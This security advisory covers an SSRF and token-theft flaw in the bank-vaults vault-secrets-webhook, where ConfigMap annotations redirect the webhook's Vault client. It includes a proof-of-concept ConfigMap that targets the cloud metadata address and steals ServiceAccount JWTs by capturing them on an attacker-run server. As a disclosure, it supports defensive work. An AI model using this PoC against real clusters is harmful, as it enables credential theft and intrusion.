# vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API

- CWE: CWE-918
- Packages: go:github.com/bank-vaults/vault-secrets-webhook

---

## Summary

The vault-secrets-webhook reads the `vault.security.banzaicloud.io/vault-addr` annotation from any ConfigMap or Secret being admitted and uses it as the Vault server address without any validation or allowlist. When a ConfigMap or Secret contains a value prefixed with `vault:`, the webhook's admission handler synchronously calls the Vault API at the attacker-supplied address from inside the webhook process during the admission review. The webhook additionally grants `serviceaccounts/token:create` cluster-wide, and the `vault-serviceaccount` annotation controls which ServiceAccount's JWT is fetched and sent to that address. An attacker who can create ConfigMaps or Secrets in a watched namespace can cause the webhook process to make arbitrary outbound HTTP connections and exfiltrate ServiceAccount JWTs.

## Details

`parseVaultConfig()` at `pkg/webhook/config.go:102-107` reads `VaultAddrAnnotation` unconditionally into `vaultConfig.Addr`:

```go
if value, ok := annotations[common.VaultAddrAnnotation]; ok {
    vaultConfig.Addr = value
}
```

No URL scheme validation, no hostname allowlist, no RFC-1918 or link-local filter.

`MutateConfigMap` and `MutateSecret` at `pkg/webhook/configmap.go` and `pkg/webhook/secret.go` call `mw.newVaultClient(ctx, vaultConfig)` when the object contains at least one `vault:...` value. Inside `newVaultClient`, at `pkg/webhook/webhook.go:285`:

```go
clientConfig.Address = vaultConfig.Addr
```

`vault.NewClientFromConfigWithContext` then opens an HTTP connection to the attacker-controlled address from the webhook server process, synchronously during the admission review. This is not deferred to a separate pod.

The `vault-skip-verify` annotation (`pkg/webhook/config.go:197`) sets `InsecureSkipVerify: true` on the TLS config, eliminating the need for a valid certificate on the attacker's server.

When `VaultServiceaccountAnnotation` is also set, at `pkg/webhook/webhook.go`:

```go
mw.k8sClient.CoreV1().ServiceAccounts(vaultConfig.ObjectNamespace).CreateToken(
    ctx, saName, &tokenRequest, metav1.CreateOptions{})
```

The webhook's ClusterRole (`deploy/charts/vault-secrets-webhook/templates/webhook-rbac.yaml`) grants `serviceaccounts/token:create` cluster-wide. The resulting JWT is then POSTed to `vaultConfig.Addr/v1/auth/<path>/login`. An attacker intercepts this JWT and replays it against the real Vault to access secrets bound to that ServiceAccount's Vault role.

## Proof of Concept

Create a ConfigMap in any watched namespace:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: ssrf-poc
  namespace: tenant-ns
  annotations:
    vault.security.banzaicloud.io/vault-addr: "http://169.254.169.254/latest/meta-data/"
    vault.security.banzaicloud.io/vault-skip-verify: "true"
    vault.security.banzaicloud.io/vault-serviceaccount: "high-priv-sa"
data:
  secret-key: "vault:secret/data/test#value"
```

When this ConfigMap is created, the vault-secrets-webhook admission handler:
1. Parses the annotations and reads `vault-addr: http://169.254.169.254/latest/meta-data/`
2. Calls `CoreV1().ServiceAccounts(tenant-ns).CreateToken(ctx, "high-priv-sa", ...)` using cluster-wide `serviceaccounts/token:create`
3. Calls `vault.NewClientFromConfigWithContext` which POSTs the JWT to `http://169.254.169.254/latest/meta-data/v1/auth/kubernetes/login`
4. On AWS EKS with IMDSv1, the cloud metadata service receives the request from the webhook pod's IAM identity

For the SA token theft path: run an HTTP server at the attacker-controlled `vault-addr` to capture the `Authorization: Bearer <JWT>` header from the login POST.

## Impact

A user with `create` or `update` on ConfigMaps or Secrets in any namespace watched by the vault-secrets-webhook can:
1. Cause the webhook process (a cluster-wide privileged component) to make arbitrary outbound HTTP connections to any address including cloud IMDS
2. Exfiltrate ServiceAccount JWTs for any SA in their namespace, which can be replayed against the real Vault server to read secrets the SA's role is authorized to access

The attack happens at admission time in the webhook server process, not in a user pod, and requires no special privileges beyond ConfigMap or Secret create/update rights.
